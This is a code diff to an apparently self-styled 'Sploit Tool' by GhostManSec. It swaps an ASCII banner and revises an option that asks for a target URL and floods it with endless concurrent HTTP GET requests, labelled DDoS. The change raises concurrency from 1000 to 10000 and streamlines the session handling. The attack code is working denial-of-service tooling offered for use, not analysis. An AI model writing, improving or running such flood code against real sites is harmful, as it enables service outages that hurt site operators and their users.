@@ -21,25 +21,11 @@ print(f'''
 {Fore.RED}GMS - GhostManSec Sploit Tool
 {Fore.RED}Dev By : @ghostman_s3c{Style.RESET_ALL}
 
-                     .------.------.    
-  +-------------+                     ___        |      |      |    
-  |             |                     \ /]       |      |      |    
-  |             |        _           _(_)        |      |      |    
-  |             |     ___))         [  | \___    |      |      |    
-  |             |     ) //o          | |     \   |      |      |    
-  |             |  _ (_    >         | |      ]  |      |      |    
-  |          __ | (O)  \__<          | | ____/   '------'------'    
-  |         /  o| [/] /   \)        [__|/_                          
-  |             | [\]|  ( \         __/___\_____                    
-  |             | [/]|   \ \__  ___|            |                   
-  |             | [\]|    \___E/%%/|____________|_____              
-  |             | [/]|=====__   (_____________________)             
-  |             | [\] \_____ \    |                  |              
-  |             | [/========\ |   |                  |              
-  |             | [\]     []| |   |                  |              
-  |             | [/]     []| |_  |                  |              
-  |             | [\]     []|___) |                  |    MEPH          
-===================================================================={Style.RESET_ALL}
+ .-.
+(o o) boo!
+| O \
+ \   \
+  `~~~'{Style.RESET_ALL}
 
      =[ GMS v1.4-dev                  ]=-
 +-- -=[ Copyright By {Fore.BLUE}Ph4mCh13n{Style.RESET_ALL}        ]=-
@@ -206,34 +192,22 @@ elif choose == "2":
         URL = input("URL Target : ")
         print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Start DDoSing to Target : {URL}")
         while True:
-            user = [
-                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-                "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
-                "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-                "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
-            ]
-            async def send_rq(user):
-                async with aiohttp.ClientSession() as session:
-                    agent = random.choice(user)
-                    headers = {"User-Agent": agent}
-                    async with session.get(URL, headers=headers) as rq:
-                        if rq.status == 200:
-                            pass
-                        else:
-                            pass
-                        return rq.text
+            async def send_rq(session):
+                async with session.get(URL) as rq:
+                    pass
+
             async def main():
-                threads = 1000
+                threads = 10000
 
                 nod = []
-                for attack in range(threads):
-                    nods = asyncio.ensure_future(send_rq(user))
-                    nod.append(nods)
+                async with aiohttp.ClientSession() as session:
+                    for i in range(threads):
+                        t = asyncio.ensure_future(send_rq(session))
+                        nod.append(t)
 
-                await asyncio.gather(*nod * threads)
-                await asyncio.gather(*nod * threads)
-
+                    await asyncio.gather(*nod*threads, await asyncio.gather(*nod*threads))
+                    await asyncio.gather(*nod*threads, await asyncio.gather(*nod*threads))
+                    
             if __name__ =='__main__':
                 loop = asyncio.get_event_loop()
                 loop.run_until_complete(main())
